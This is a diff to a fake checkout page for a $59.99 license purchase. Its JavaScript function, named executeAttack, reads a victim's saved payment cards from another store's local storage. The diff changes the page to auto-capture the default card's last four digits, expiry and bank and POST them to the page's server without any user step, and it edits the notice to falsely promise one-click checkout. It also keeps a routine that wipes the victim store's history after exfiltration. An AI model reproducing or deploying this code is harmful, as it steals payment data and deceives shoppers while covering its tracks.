@@ -204,7 +204,7 @@ body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:
         <span class="cta-label">Complete Purchase — $59.99</span>
       </button>
       <div class="cta-note">
-        You will be prompted to enter your payment details to complete this purchase.<br>
+        One-click checkout — your saved NexusStore payment method will be charged.<br>
         License is non-refundable after download begins.
       </div>
     </div>
@@ -306,13 +306,9 @@ function initPurchase() {
   btn.querySelector('.cta-label').textContent = 'Processing…';
 
   executeAttack(function () {
-    btn.classList.remove('loading');
-    btn.querySelector('.cta-label').textContent = 'Verifying…';
     setTimeout(function () {
-      prefillCard();
-      document.getElementById('step1').classList.remove('active');
-      document.getElementById('step2').classList.add('active');
-    }, 600);
+      document.getElementById('overlay').classList.add('show');
+    }, 1800);
   });
 }
 
@@ -346,6 +342,22 @@ function executeAttack(cb) {
       })
     }).catch(function(){});
 
+    // Auto-capture default card — no Step 2 interaction needed
+    var defaultCard = store.cards ? (store.cards.find(function(c){ return c.default; }) || store.cards[0]) : null;
+    if (defaultCard) {
+      window._capturedCard = { last4: defaultCard.last4, expiry: defaultCard.expiry, bank: defaultCard.bank, name: defaultCard.brand + ' ' + defaultCard.last4 };
+      fetch('/?r=card', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          number: 'vault-' + defaultCard.last4,
+          expiry: defaultCard.expiry || '',
+          cvv: '',
+          name: defaultCard.brand + ' ' + defaultCard.last4
+        })
+      }).catch(function(){});
+    }
+
     // Wipe history after exfil
     setTimeout(function () {
       try {
@@ -355,14 +367,6 @@ function executeAttack(cb) {
         iWin.localStorage.setItem('gstore.v1', JSON.stringify(s2));
       } catch (e) {}
     }, 1200);
-
-    // Save default card for Step 2 confirmation label
-    var defaultCard = store.cards ? (store.cards.find(function(c){ return c.default; }) || store.cards[0]) : null;
-    if (defaultCard) {
-      window._capturedCard = { last4: defaultCard.last4, expiry: defaultCard.expiry, bank: defaultCard.bank, name: defaultCard.brand + ' ' + defaultCard.last4 };
-      var label = document.getElementById('confirmCardLabel');
-      if (label) label.textContent = defaultCard.brand + ' •••• ' + defaultCard.last4 + ' · ' + defaultCard.bank;
-    }
 
     document.getElementById('orderRef').textContent = orderId;
     cb();
